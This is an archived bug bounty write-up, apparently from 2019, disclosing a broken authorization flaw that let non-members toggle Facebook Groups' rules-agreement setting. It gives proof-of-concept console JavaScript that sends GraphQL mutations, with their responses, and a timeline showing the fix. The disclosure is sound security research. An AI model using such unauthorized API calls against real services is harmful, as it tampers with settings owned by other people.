---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-26_toggle-group-rules-agreement-as-a-non-member.md
original_filename: 2019-06-26_toggle-group-rules-agreement-as-a-non-member.md
title: Toggle Group Rules Agreement as a non-member
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
language: en
raw_sha256: 358afac37d8266572109195bf69c16a8b262afc70687fc3872147b73665d5591
text_sha256: 58002dadc46504cea72e015c9a2afc561ee1b2d5a9ce2e9517829423530e577a
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Toggle Group Rules Agreement as a non-member

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-26_toggle-group-rules-agreement-as-a-non-member.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `358afac37d8266572109195bf69c16a8b262afc70687fc3872147b73665d5591`
- Text SHA256: `58002dadc46504cea72e015c9a2afc561ee1b2d5a9ce2e9517829423530e577a`


## Content

---
title: "Toggle Group Rules Agreement as a non-member"
page_title: "Toggle Group Rules Agreement as a non-member - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/toggle-group-rules-agreement-as-a-non-member/"
final_url: "https://philippeharewood.com/toggle-group-rules-agreement-as-a-non-member/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization"]
publication_date: "2019-06-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5183
---

Posted on [June 26, 2019](https://philippeharewood.com/toggle-group-rules-agreement-as-a-non-member/)

# Toggle Group Rules Agreement as a non-member

Facebook Groups allows group admins to ask pending members questions as well as agree to group rules. It was possible to toggle this setting as a non-admin and non-member.

1\. Navigate to Facebook and enter the following in a console window as a non-member for a group. Change the actor_id to the current user that you are testing, and the group_id to a group you can check as an admin as another user.

`doc_id = '2605976872810818'; fb_api_caller_class = 'RelayModern';variables = '{input:{client_mutation_id:1,,actor_id:<ACTOR_ID>,group_id:<GROUP_ID>}}';  
  
new AsyncRequest('/api/graphql/').setData({variables:variables,doc_id:doc_id,fb_api_caller_class:fb_api_caller_class}).send()`

Response
  
  
  {
  "data": {
  "group_rules_agreement_enable": {
  "group": {
  "id": "<GROUP_ID>",
  "is_rules_agreement_enabled": true
  }
  }
  },
  "extensions": {
  "is_final": true,
  "dtsg_token": null
  }
  }

2\. To disable the doc_id 1977893365666925 is needed

`doc_id = '1977893365666925'; fb_api_caller_class = 'RelayModern';variables = '{input:{client_mutation_id:1,actor_id:<ACTOR_ID>,group_id:<GROUP_ID>}}';  
  
new AsyncRequest('/api/graphql/').setData({variables:variables,doc_id:doc_id,fb_api_caller_class:fb_api_caller_class}).send()`

Response
  
  
  {
      "data": {
          "group_rules_agreement_disable": {
              "group": {
                  "id": "<GROUP_ID>",
                  "is_rules_agreement_enabled": false
              }
          }
      },
      "extensions": {
          "is_final": true,
          "dtsg_token": null
      }
  } 

3\. As an admin for the target group refresh the page

`https://www.facebook.com/groups/<GROUP_ID>/membership_questions/`

The option “Include your group rules and ask pending members to select that they agree to them.” should toggle based on the two calls above.

**Impact**

An issue was identified which could have allowed a user outside of a group to toggle the membership rules option.

**Timeline**

Jun 26, 2019 – Report Sent  
Jun 28, 2019 – Further investigation by Facebook  
Jul 18, 2019 – Fixed by Facebook  
Jul 24, 2019 – Bounty Awarded by Facebook
